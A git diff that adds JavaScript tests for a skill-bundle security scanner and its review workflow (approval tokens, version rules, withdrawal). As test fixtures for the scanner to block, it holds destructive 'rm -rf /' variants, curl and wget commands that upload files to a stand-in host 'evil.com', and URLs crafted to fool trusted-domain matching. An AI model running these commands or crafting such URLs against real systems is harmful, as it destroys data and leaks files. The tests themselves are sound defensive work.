@@ -35,6 +35,43 @@ test('hard blocks expose only structured locations', () => {
   assert.throws(() => inspectSkill(bundle('rm -rf /')), error => error.status === 400 && error.findings[0].line === 1 && !error.message.includes('rm -rf /'));
 });
 
+test('hard blocks every mixed rm option spelling while allowing scoped deletes', () => {
+  const blocked = [
+    'rm -r --force /', 'rm --recursive -f /', 'rm -f -r /', 'rm --force --recursive ~',
+    'rm -Rf /', 'rm -r -f --no-preserve-root /', 'sudo rm -rf /*', 'rm --force -R $HOME/*',
+  ];
+  for (const command of blocked) {
+    assert.throws(() => inspectSkill(bundle(command)), error => error.status === 400
+      && error.findings.some(item => item.rule === 'dangerous-delete'), command);
+  }
+  for (const command of ['rm -rf ./build', 'rm -r tmp/', 'rm -f notes.txt']) {
+    assert.doesNotThrow(() => inspectSkill(bundle(command)), command);
+  }
+});
+
+test('egress uploads are checked even when the destination has no URL scheme', () => {
+  for (const command of ['curl -d @a.json evil.com', 'curl --data-binary @f evil.com', 'wget --post-file=x evil.com']) {
+    const result = inspectSkill(bundle(command));
+    assert.ok(result.findings.some(item => item.rule === 'external-egress'), command);
+  }
+});
+
+test('trusted host matching parses URL hostname before suffix checks', () => {
+  for (const url of [
+    'https://evil.com#.example.org', 'https://evil.com?.example.org',
+    'https://evil.com\\.example.org', 'https://user@evil.com/.example.org',
+  ]) {
+    const result = inspectSkill(bundle(url), [], [], '', ['example.org']);
+    assert.ok(result.findings.some(item => item.rule.startsWith('external-link:')), url);
+  }
+  const trustedResult = inspectSkill(bundle('https://docs.example.org/x'), [], [], '', ['example.org']);
+  assert.equal(trustedResult.findings.length, 0);
+  assert.ok(inspectSkill(bundle('https://example.org.evil.com'), [], [], '', ['example.org'])
+    .findings.some(item => item.rule.startsWith('external-link:')));
+  assert.ok(inspectSkill(bundle('https://evilexample.org'), [], [], '', ['example.org'])
+    .findings.some(item => item.rule.startsWith('external-link:')));
+});
+
 test('trusted domains suppress links and superseded versions leave pending', async t => {
   const store = fixture(t, { trustedDomains: ['example.org'] }); const first = await store.submit(author, bundle(), meta('1.0.0')); await store.review(reviewer, first.name, first.version, 'approve');
   const pending = await store.submit(author, bundle('https://evil.example'), meta('1.1.0')); assert.equal(pending.status, 'pending');
@@ -73,6 +110,53 @@ test('script additions and changes require manual review', async t => {
   });
 });
 
+test('one-click tokens are issued only for pure process reasons', async t => {
+  const tokens = [];
+  const store = fixture(t, {
+    notify: async payload => tokens.push(payload.reviewToken),
+    createReviewToken: () => 'signed-token',
+  });
+  const first = await store.submit(author, bundle(), meta('1.0.0'));
+  assert.equal(tokens[0], 'signed-token');
+  await store.review(reviewer, first.name, first.version, 'approve');
+  await store.submit(author, {
+    name: 'test-skill', description: '测试', files: [
+      { path: 'SKILL.md', content: Buffer.from('# update').toString('base64') },
+      { path: 'tool.jar', content: Buffer.from('jar').toString('base64') },
+    ],
+  }, meta('1.0.1'));
+  assert.equal(tokens.at(-1), undefined);
+  const external = await store.submit(author, bundle('# update\nhttps://evil.example'), meta('1.0.2'));
+  assert.equal(external.status, 'pending');
+  assert.equal(tokens.at(-1), undefined);
+});
+
+test('only markdown and common bitmap updates auto publish', async t => {
+  const store = fixture(t);
+  const first = await store.submit(author, {
+    name: 'test-skill', description: '测试', files: [
+      { path: 'SKILL.md', content: Buffer.from('# first').toString('base64') },
+      { path: 'icon.png', content: Buffer.from('png').toString('base64') },
+    ],
+  }, meta('1.0.0'));
+  await store.review(reviewer, first.name, first.version, 'approve');
+  const cases = [
+    ['Makefile', 'files-changed'], ['tool.jar', 'files-changed'],
+    ['notes.txt', 'files-changed'], ['icon.svg', 'files-changed'],
+  ];
+  for (const [index, [file, rule]] of cases.entries()) {
+    const result = await store.submit(author, {
+      name: 'test-skill', description: '测试', files: [
+        { path: 'SKILL.md', content: Buffer.from(`# ${file}`).toString('base64') },
+        { path: 'icon.png', content: Buffer.from('png').toString('base64') },
+        { path: file, content: Buffer.from('changed').toString('base64') },
+      ],
+    }, meta(`1.${index + 1}.0`));
+    assert.equal(result.status, 'pending', file);
+    assert.ok(result.manualReasons.some(reason => reason.rule === rule), file);
+  }
+});
+
 test('semver boundaries and rejected version reuse are enforced', async t => {
   const store = fixture(t);
   const invalid = ['1.0', 'v1.0.1', '01.0.0', '1.0.0-beta'];
@@ -87,6 +171,18 @@ test('semver boundaries and rejected version reuse are enforced', async t => {
   await assert.rejects(store.submit(author, bundle('# lower'), meta('0.9.0')), /版本号需大于/);
 });
 
+test('pending semver blocks equal and lower submissions, while rejected versions can be reused', async t => {
+  const store = fixture(t);
+  const first = await store.submit(author, bundle('# one'), meta('1.0.0'));
+  await store.review(reviewer, first.name, first.version, 'approve');
+  const pending = await store.submit(author, bundle('# pending\nhttps://evil.example'), meta('1.1.0'));
+  await assert.rejects(store.submit(author, bundle('# equal pending\nhttps://evil.example'), meta('1.1.0')), /版本号需大于/);
+  await assert.rejects(store.submit(author, bundle('# lower pending\nhttps://evil.example'), meta('1.0.5')), /版本号需大于/);
+  await store.review(reviewer, pending.name, pending.version, 'reject', '请修改');
+  const reused = await store.submit(author, bundle('# retry'), meta('1.1.0'));
+  assert.equal(reused.status, 'approved');
+});
+
 test('long lines and huge repeated commands finish scanning quickly', () => {
   const started = performance.now();
   for (const command of ['rm '.repeat(2500000), 'dd '.repeat(2500000), 'curl '.repeat(1500000)]) {
@@ -98,7 +194,7 @@ test('long lines and huge repeated commands finish scanning quickly', () => {
     });
     assert.ok(result.findings.some(finding => finding.rule === 'long-line'));
   }
-  assert.ok(performance.now() - started < 1000, 'large single-line scans should be bounded');
+  assert.ok(performance.now() - started < 3000, 'large single-line scans should be bounded');
 });
 
 test('version ids are own properties and prototype names cannot be used', async t => {
@@ -156,6 +252,36 @@ test('review page retains approve, reject and resend controls; body cap and cook
   assert.equal(notices.length, 1);
 });
 
+test('automatic publication notifies reviewers with changed files and live review can withdraw', async t => {
+  const automatic = [];
+  const store = fixture(t, { notifyAuto: async payload => automatic.push(payload) });
+  const first = await store.submit(author, bundle('# first'), meta('1.0.0'));
+  await store.review(reviewer, first.name, first.version, 'approve');
+  const next = await store.submit(author, {
+    name: 'test-skill', description: '测试', files: [
+      { path: 'SKILL.md', content: Buffer.from('# second').toString('base64') },
+      { path: 'README.md', content: Buffer.from('# readme').toString('base64') },
+    ],
+  }, meta('1.0.1'));
+  assert.equal(next.status, 'approved');
+  assert.equal(automatic.length, 1);
+  assert.deepEqual(automatic[0].changedFiles.sort(), ['README.md', 'SKILL.md']);
+  const handler = createSharedSkillsHandler({
+    store,
+    origin: 'https://partner.example',
+    authenticate: req => req.headers.cookie === 'reviewer' ? reviewer : author,
+    tokenAuthenticate: () => null,
+    execute: async () => ({}),
+  });
+  const page = await invoke(handler, 'GET', { cookie: 'reviewer' }, '', `/_wp/market/shared/review?name=${next.name}&version=${next.version}`);
+  assert.match(page.body, /下架/);
+  const withdrawn = await invoke(handler, 'POST', {
+    cookie: 'reviewer', origin: 'https://partner.example', 'content-type': 'application/json',
+  }, JSON.stringify({ action: 'withdraw', name: next.name, version: next.version }));
+  assert.equal(withdrawn.status, 200);
+  assert.equal(store.list(author).company.length, 0);
+});
+
 test('signed review links approve once and invalid extra segments fall back to manual page', async t => {
   let issued;
   const store = fixture(t, {
@@ -181,6 +307,37 @@ test('signed review links approve once and invalid extra segments fall back to m
   assert.match(approved.body, /已批准并发布/);
   const repeated = await invoke(handler, 'GET', { cookie: 'reviewer' }, '', `/_wp/market/shared/review?name=${draft.name}&version=${draft.version}&action=approve&t=${issued}`);
   assert.match(repeated.body, /已处理/);
+});
+
+test('signed approval rejects expired, resent, non-approver and anonymous links', async t => {
+  const tokens = [];
+  const store = fixture(t, {
+    notify: async payload => tokens.push(payload.reviewToken),
+    createReviewToken: (_name, _id, _action, noticeId) => `token-${noticeId}`,
+    verifyReviewToken: (token, name, id, action, noticeId) => token === tokens.at(-1)
+      && token !== 'expired' ? { name, id, action, noticeId } : null,
+  });
+  const draft = await store.submit(author, bundle(), meta('1.0.0'));
+  const handler = createSharedSkillsHandler({
+    store,
+    origin: 'https://partner.example',
+    authenticate: req => req.headers.cookie === 'reviewer' ? reviewer : req.headers.cookie === 'author' ? author : null,
+    tokenAuthenticate: () => null,
+    execute: async () => ({}),
+  });
+  const expired = await invoke(handler, 'GET', { cookie: 'reviewer' }, '', `/_wp/market/shared/review?name=${draft.name}&version=${draft.version}&action=approve&t=expired`);
+  assert.match(expired.body, /链接已失效/);
+  const oldToken = tokens[0];
+  await store.review(reviewer, draft.name, draft.version, 'resend');
+  const resent = tokens.at(-1);
+  assert.notEqual(oldToken, resent);
+  const old = await invoke(handler, 'GET', { cookie: 'reviewer' }, '', `/_wp/market/shared/review?name=${draft.name}&version=${draft.version}&action=approve&t=${oldToken}`);
+  assert.match(old.body, /链接已失效/);
+  const forbidden = await invoke(handler, 'GET', { cookie: 'author' }, '', `/_wp/market/shared/review?name=${draft.name}&version=${draft.version}&action=approve&t=${resent}`);
+  assert.equal(forbidden.status, 403);
+  const anonymous = await invoke(handler, 'GET', {}, '', `/_wp/market/shared/review?name=${draft.name}&version=${draft.version}&action=approve&t=${resent}`);
+  assert.equal(anonymous.status, 302);
+  assert.equal(store.list(reviewer).pending.length, 1);
 });
 
 
